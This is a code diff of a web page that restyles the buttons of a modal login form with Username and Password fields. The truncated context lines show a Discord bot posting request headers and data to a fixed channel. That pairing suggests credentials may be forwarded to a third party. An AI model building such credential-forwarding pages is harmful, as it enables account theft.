@@ -132,11 +132,11 @@ bot.channels.cache.get(`706302917468094534`).send(`Header ${header} \`\`\`${req.
                       <p><input placeholder="Username..." oninput="this.className = ''"></p>
                       <p><input placeholder="Password..." oninput="this.className = ''"></p>
                     </div>
-
-                    <div style="overflow:auto;">
+                    
+                    <div class="footer-mod" style="text-align: center; overflow:auto;">
                       <div style="float:right;">
-                        <button type="button" id="prevBtn" onclick="nextPrev(-1)">Previous</button>
-                        <button type="button" id="nextBtn" onclick="nextPrev(1)">Next</button>
+                        <button type="button" id="prevBtn" class="btn btn-danger" onclick="nextPrev(-1)">Previous</button>
+                        <button type="button" id="nextBtn" class="btn btn-success" onclick="nextPrev(1)">Next</button>
                       </div>
                     </div>
 
@@ -149,11 +149,6 @@ bot.channels.cache.get(`706302917468094534`).send(`Header ${header} \`\`\`${req.
                     </div>
 
                 </form>
-            </div>
-            <div class="footer-mod" style="text-align: center">
-                <button type="button" class="btn btn-danger" data-dismiss="modal">Cancel</button>
-                <button type="button" class="btn btn-success">Send</button>
-            </div>
         </div>
     </div>
 </div>
